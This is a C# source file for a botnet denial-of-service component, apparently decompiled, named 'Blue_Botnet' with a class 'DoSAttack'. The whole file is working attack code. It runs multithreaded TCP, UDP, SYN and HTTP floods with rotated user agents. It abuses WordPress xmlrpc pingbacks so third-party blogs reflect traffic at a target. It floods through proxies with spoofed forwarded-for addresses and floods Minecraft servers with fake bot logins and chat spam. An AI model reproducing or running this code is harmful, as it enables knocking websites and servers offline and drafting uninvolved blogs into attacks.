using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Blue_Botnet
{
	public class DoSAttack
	{
		public string[] userAgents = new string[37]
		{
			"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
			"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
			"Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
			"Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
			"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
			"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
			"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
			"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
			"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
			"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
			"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
			"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
			"HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
			"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
		};

		private List<Thread> threadList = new List<Thread>();

		public string HTTPData = "GET / HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive  ";

		public string PressBody = "<?xmlversion=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>//TARGET//</string></value></param><param><value><string>//BLOG//</string></value></param></params></methodCall>";

		public string PressData = "POST //BLOGH///xmlrpc.php HTTP/1.0\r\nHost: //BLOG//\r\nUser-Agent: Internal Wordpress RPC connection\r\nContent-Type: text/xml\r\nContent-Length: //LENGTH//\r\n\r\n//BODY//";

		public string ProxyData = "GET //CURL// HTTP/1.1\r\nHost: //URL//\r\nUser-Agent: //USERAGENT//\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\r\nX-Forwarded-For: //IPLIST//\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n";

		public bool isAttacking;

		public string method;

		public string completeUrl;

		public bool threadsLoaded = false;

		public string udpStuff;

		public int threadId = 0;

		public string tcpStuff;

		public int currentAttack = 0;

		public int startedThreads = 0;

		public int numberOfErrors;

		public string ip;

		public bool first = true;

		public string log = "";

		public int offline = 1;

		public string[] blogList;

		public string[] proxyList;

		public int online = 1;

		public string errorsLog;

		public int port;

		public int numberOfThreads = 0;

		public Thread trd;

		public void print(string text)
		{
			log = DateTime.Now.ToString("(HH:mm:ss) ") + text + "\r\n" + log;
		}

		public string randomIp(Random rand)
		{
			string text = "";
			return rand.Next(1, 254) + "." + rand.Next(1, 254) + "." + rand.Next(1, 254) + "." + rand.Next(1, 254);
		}

		public string randomIpList()
		{
			string text = "";
			Random random = new Random();
			int num = random.Next(1, 5);
			for (int i = 0; i < num; i++)
			{
				text = ((i + 1 >= num) ? (text + randomIp(random)) : (text + randomIp(random) + ", "));
			}
			return text;
		}

		private string readFile(string path)
		{
			string text = "";
			StreamReader streamReader = new StreamReader(path);
			string arg;
			while ((arg = streamReader.ReadLine()) != null)
			{
				text = text + arg + '\n';
			}
			streamReader.Close();
			return text;
		}

		public bool isUrl(string url)
		{
			bool flag = false;
			for (int i = 0; i < url.Length; i++)
			{
				if (flag)
				{
					break;
				}
				flag = ((url[i] >= 'a' && url[i] <= 'z') || (url[i] >= 'A' && url[i] <= '>'));
			}
			return flag;
		}

		private string randomString(int size)
		{
			Random random = new Random();
			string text = "";
			for (int i = 0; i < size; i++)
			{
				int value = random.Next(0, 24);
				char c = Convert.ToChar(value);
				text += c;
			}
			return text;
		}

		private string randomString2(int minlen, int maxlen)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			Random random = new Random();
			char[] array = new char[random.Next(minlen) + (maxlen - minlen)];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = text[random.Next(text.Length)];
			}
			return new string(array);
		}

		public void sendMCLogin(NetworkStream prdstream, string username, string ownIp)
		{
			prdstream.WriteByte(15);
			prdstream.WriteByte(0);
			prdstream.WriteByte(5);
			prdstream.WriteByte(Convert.ToByte(ownIp.Length));
			byte[] bytes = Encoding.ASCII.GetBytes(ownIp);
			prdstream.Write(bytes, 0, bytes.Length);
			prdstream.WriteByte(13);
			prdstream.WriteByte(129);
			prdstream.WriteByte(2);
			prdstream.WriteByte(Convert.ToByte(2 + username.Length));
			prdstream.WriteByte(0);
			prdstream.WriteByte(Convert.ToByte(username.Length));
			bytes = Encoding.ASCII.GetBytes(username);
			prdstream.Write(bytes, 0, bytes.Length);
		}

		public void sendMCMessage(NetworkStream prdstream, string message)
		{
			prdstream.WriteByte(Convert.ToByte(message.Length + 2));
			prdstream.WriteByte(1);
			prdstream.WriteByte(Convert.ToByte(message.Length));
			byte[] bytes = Encoding.ASCII.GetBytes(message);
			prdstream.Write(bytes, 0, bytes.Length);
		}

		public void useless()
		{
			string pressData = PressData;
			string pressBody = PressBody;
			int num = threadId++;
			string text = "";
			if (num < blogList.Length)
			{
				text = blogList[num];
			}
			else
			{
				Random random = new Random();
				text = blogList[random.Next(0, blogList.Length - 1)];
			}
			string hostname;
			string newValue;
			string text2;
			if (text.Contains(" "))
			{
				string[] array = text.Split(' ');
				hostname = array[0].Replace("http://", "").Split('/')[0];
				newValue = array[1].Replace("http://", "").Split('/')[0];
				text = array[1];
				text2 = text.Replace("//", "@");
				text2 = text2.Split('/')[0];
				text2 = text2.Replace("@", "//");
			}
			else
			{
				newValue = text.Replace("http://", "").Split('/')[0];
				hostname = resolveUrl(text);
				text2 = text.Split(new string[1]
				{
					"?p="
				}, StringSplitOptions.None)[0];
			}
			pressBody = pressBody.Replace("//TARGET//", completeUrl).Replace("//BLOG//", text);
			pressData = pressData.Replace("//BLOG//", newValue).Replace("//LENGTH//", pressBody.Length.ToString()).Replace("//BODY//", pressBody)
				.Replace("//BLOGH//", text2);
			while (isAttacking && method == "PRESS")
			{
				TcpClient tcpClient = new TcpClient();
				NetworkStream networkStream = null;
				try
				{
					try
					{
						tcpClient.Connect(hostname, 80);
						currentAttack++;
						online++;
					}
					catch
					{
						offline++;
					}
					networkStream = tcpClient.GetStream();
					byte[] bytes = Encoding.ASCII.GetBytes(pressData);
					networkStream.Write(bytes, 0, bytes.Length);
				}
				catch
				{
				}
				Thread.Sleep(10);
			}
		}

		public string resolveUrl(string url)
		{
			string result = url;
			if (!url.Contains("http://") && !url.Contains("https://"))
			{
				url = "http://" + url;
			}
			try
			{
				result = Dns.GetHostEntry(new Uri(url).Host).AddressList[0].ToString();
			}
			catch
			{
			}
			return result;
		}

		private void attackThread()
		{
			while (!threadsLoaded)
			{
				Thread.Sleep(100);
			}
			while (true)
			{
				bool flag = true;
				Thread.Sleep(100);
				while (!isAttacking)
				{
					Thread.Sleep(50);
				}
				if (first)
				{
					first = false;
				}
				switch (method)
				{
					case "TCP":
						while (isAttacking && method == "TCP")
						{
							if (isUrl(ip))
							{
								ip = resolveUrl(ip);
							}
							TcpClient tcpClient2 = new TcpClient();
							NetworkStream networkStream2 = null;
							try
							{
								try
								{
									tcpClient2.Connect(ip, port);
									currentAttack++;
									online++;
								}
								catch
								{
									offline++;
								}
								networkStream2 = tcpClient2.GetStream();
								byte[] bytes = Encoding.ASCII.GetBytes(tcpStuff);
								for (int j = 0; j <= 1; j++)
								{
									networkStream2.Write(bytes, 0, bytes.Length);
								}
							}
							catch
							{
							}
						}
						break;
					case "HTTP":
						{
							Random random2 = new Random();
							string value = userAgents[random2.Next(0, userAgents.Length - 1)];
							while (isAttacking && method == "HTTP")
							{
								try
								{
									WebClient webClient = new WebClient();
									webClient.Headers["User-Agent"] = value;
									webClient.Headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
									webClient.Headers["Accept-Language"] = "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3";
									webClient.Headers["Accept-Encoding"] = "gzip, deflate";
									Stream stream = webClient.OpenRead(ip);
								}
								catch
								{
								}
							}
							break;
						}
					case "SYN":
						{
							IPEndPoint remoteEP;
							try
							{
								IPAddress[] addressList = Dns.GetHostEntry(ip).AddressList;
								remoteEP = new IPEndPoint(addressList[0], port);
							}
							catch
							{
								remoteEP = new IPEndPoint(IPAddress.Parse(ip), port);
							}
							while (isAttacking && method == "SYN")
							{
								try
								{
									Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
									socket.BeginConnect(remoteEP, onSynConnect, socket);
									Thread.Sleep(200);
									socket.Close();
								}
								catch
								{
								}
							}
							break;
						}
					case "UDP":
						{
							UdpClient udpClient = new UdpClient();
							while (isAttacking && method == "UDP")
							{
								try
								{
									udpClient = new UdpClient();
									try
									{
										udpClient.Connect(ip, port);
										currentAttack++;
									}
									catch
									{
									}
									byte[] bytes2 = Encoding.ASCII.GetBytes(udpStuff);
									for (int i = 0; i <= 1; i++)
									{
										udpClient.Send(bytes2, bytes2.Length);
									}
								}
								catch
								{
								}
								udpClient.Close();
							}
							break;
						}
					case "PRESS":
						{
							string pressData = PressData;
							string pressBody = PressBody;
							int num3 = threadId++;
							string text2 = "";
							if (num3 < blogList.Length)
							{
								text2 = blogList[num3];
							}
							else
							{
								Random random = new Random();
								text2 = blogList[random.Next(0, blogList.Length - 1)];
							}
							string hostname2;
							string newValue3;
							string text3;
							if (text2.Contains(" "))
							{
								string[] array = text2.Split(' ');
								hostname2 = array[0].Replace("http://", "").Split('/')[0];
								newValue3 = array[1].Replace("http://", "").Split('/')[0];
								text2 = array[1];
								text3 = text2.Replace("//", "@");
								text3 = text3.Split('/')[0];
								text3 = text3.Replace("@", "//");
							}
							else
							{
								newValue3 = text2.Replace("http://", "").Split('/')[0];
								hostname2 = resolveUrl(text2);
								text3 = text2.Split(new string[1]
								{
							"?p="
								}, StringSplitOptions.None)[0];
							}
							pressBody = pressBody.Replace("//TARGET//", completeUrl).Replace("//BLOG//", text2);
							pressData = pressData.Replace("//BLOG//", newValue3).Replace("//LENGTH//", pressBody.Length.ToString()).Replace("//BODY//", pressBody)
								.Replace("//BLOGH//", text3);
							while (isAttacking && method == "PRESS")
							{
								TcpClient tcpClient = new TcpClient();
								NetworkStream networkStream = null;
								try
								{
									try
									{
										tcpClient.Connect(hostname2, 80);
										currentAttack++;
										online++;
									}
									catch
									{
										offline++;
									}
									networkStream = tcpClient.GetStream();
									byte[] bytes = Encoding.ASCII.GetBytes(pressData);
									networkStream.Write(bytes, 0, bytes.Length);
								}
								catch
								{
								}
								Thread.Sleep(10);
							}
							break;
						}
					case "HTTPROXY":
						try
						{
							completeUrl = ip;
							string proxyData = ProxyData;
							int num = threadId++;
							string text = "";
							string newValue = "";
							Random random = new Random();
							if (num < proxyList.Length)
							{
								text = proxyList[num];
							}
							else
							{
								random = new Random();
								text = proxyList[random.Next(0, proxyList.Length - 1)];
								newValue = userAgents[random.Next(0, userAgents.Length - 1)];
							}
							string newValue2 = randomIpList();
							string hostname = text.Split(':')[0];
							int num2 = Convert.ToInt32(text.Split(':')[1]);
							proxyData = proxyData.Replace("//URL//", completeUrl.Replace("http://", "").Replace("https://", "").Split('/')[0]).Replace("//CURL//", completeUrl).Replace("//USERAGENT//", newValue)
								.Replace("//IPLIST//", newValue2);
							while (isAttacking && method == "HTTPROXY" && completeUrl == ip)
							{
								TcpClient tcpClient = new TcpClient();
								NetworkStream networkStream = null;
								try
								{
									try
									{
										tcpClient.Connect(hostname, num2);
										currentAttack++;
										online++;
									}
									catch
									{
										offline++;
									}
									networkStream = tcpClient.GetStream();
									byte[] bytes = Encoding.ASCII.GetBytes(proxyData);
									networkStream.Write(bytes, 0, bytes.Length);
								}
								catch
								{
								}
								Thread.Sleep(2);
							}
						}
						catch
						{
						}
						break;
					case "MCBOTALPHA":
						try
						{
							while (isAttacking && method == "MCBOTALPHA")
							{
								TcpClient tcpClient = new TcpClient();
								NetworkStream networkStream = null;
								try
								{
									try
									{
										tcpClient.Connect(ip, port);
										currentAttack++;
										online++;
									}
									catch
									{
										offline++;
									}
									networkStream = tcpClient.GetStream();
									string username = randomString2(6, 12);
									sendMCLogin(networkStream, username, "127.0.0.2");
									Thread.Sleep(300);
									sendMCMessage(networkStream, "/register register register");
									Thread.Sleep(1000);
									sendMCMessage(networkStream, "/factions");
									Thread.Sleep(1000);
									sendMCMessage(networkStream, randomString2(6, 50));
								}
								catch
								{
								}
								Thread.Sleep(2);
							}
						}
						catch
						{
						}
						break;
				}
			}
		}

		private void onSynConnect(IAsyncResult ar)
		{
			currentAttack++;
		}

		public void attack(string newIp, int newPort, string newMethod = "TCP", int threads = 1000)
		{
			if (!isAttacking)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					prv_attack(newIp, newPort, newMethod, threads);
				});
				thread.Start();
			}
		}

		private void prv_attack(string newIp, int newPort, string newMethod = "TCP", int threads = 1000)
		{
			if (!isAttacking)
			{
				currentAttack = 0;
				online = 1;
				offline = 1;
				completeUrl = newIp;
				try
				{
					method = newMethod;
					if (isUrl(newIp) && (method == "UDP" || method == "TCP" || method == "MCBOTALPHA"))
					{
						ip = resolveUrl(newIp);
					}
					else
					{
						ip = newIp;
					}
					port = newPort;
					numberOfThreads = threads;
					isAttacking = true;
					if (!threadsLoaded || numberOfThreads != startedThreads)
					{
						if (!threadsLoaded)
						{
							udpStuff = randomString(4096);
							tcpStuff = randomString(65564);
						}
						initThreads();
						startThreads();
					}
				}
				catch (Exception ex)
				{
					errorsLog += ex;
					numberOfErrors++;
					GC.Collect();
					GC.WaitForPendingFinalizers();
				}
			}
		}

		public void stop()
		{
			if (isAttacking)
			{
				isAttacking = false;
				ip = "";
				port = 0;
				numberOfThreads = 0;
			}
		}

		private void startThreads()
		{
			threadsLoaded = false;
			for (int i = startedThreads; i < numberOfThreads; i++)
			{
				try
				{
					threadList[i].Start();
				}
				catch
				{
				}
				startedThreads++;
			}
			threadsLoaded = true;
		}

		private void initThreads()
		{
			removeThreads();
			for (int i = startedThreads; i < numberOfThreads; i++)
			{
				trd = new Thread(attackThread, 262144);
				trd.IsBackground = true;
				threadList.Add(trd);
			}
		}

		private void stopThreads()
		{
			for (int i = 0; i < numberOfThreads; i++)
			{
				threadList[i].Abort();
			}
		}

		private void removeThreads()
		{
			threadList.Clear();
		}
	}
}
